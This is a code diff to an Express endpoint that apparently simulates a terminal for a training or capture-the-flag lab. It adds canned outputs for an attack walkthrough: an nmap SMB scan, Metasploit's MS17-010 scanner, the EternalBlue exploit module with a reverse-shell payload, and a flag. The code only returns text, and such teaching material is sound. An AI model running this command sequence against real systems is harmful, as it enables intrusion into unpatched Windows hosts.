@@ -279,12 +279,19 @@ initializeDatabaseConnection()
         app.post('/execute-command', async (req, res) => {
             const { command } = req.body; // Extract the command from the request body
 
-            // Define responses or actions for each command
             const commandResponses = {
-                'hello': 'Hello, world!\r\n',
                 'date': () => `Current Date and Time: ${new Date().toString()}\r\n`,
-                // Add other commands and their responses or functions here
+                'nmap -p 139,445 192.168.1.0/24': () => `Starting Nmap 7.94 ( https://nmap.org )\nNmap scan report for 192.168.1.103\nHost is up (0.011s latency).\nPORT    STATE    SERVICE\n139/tcp open     netbios-ssn\n445/tcp open     microsoft-ds\r\n`,
+                'msfconsole': () => `Launching msfconsole....\r\n`,
+                'use auxiliary/scanner/smb/smb_ms17_010': () => `msf auxiliary(scanner/smb/smb_ms17_010)>\r\n`,
+                'set RHOST 192.168.1.103': () => `RHOSTS => 192.168.1.103\r\n`,
+                'run': () => `[+] 192.168.1.103:445 - Host is likely VULNERABLE to MS17-010! - Windows Server 2012 R2 x64 (64-bit)\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution complete\r\n`,
+                'use exploit/windows/smb/ms17_010_eternalblue': () => `msf exploit(windows/smb/ms17_010_eternalblue)>\r\n`,
+                'set payload generic/shell_reverse_tcp': () => `payload => generic/shell_reverse_tcp\r\n`,
+                'exploit': () => `Exploiting 192.168.1.103....\n....\nExploited....\nFLAG: u46U0o\r\n`,
+                'help-module1': () => `Available Module 1 Commands:\n- nmap -p 139,445 192.168.1.0/24\n- msfconsole\n- use auxiliary/scanner/smb/smb_ms17_010\n- set RHOST 192.168.1.103\n- run\n- use exploit/windows/smb/ms17_010_eternalblue\n- set payload generic/shell_reverse_tcp\nFor more information on each command, please refer to the respective tool's documentation.\r\n`
             };
+            
 
             if (command in commandResponses) {
                 const response = commandResponses[command];
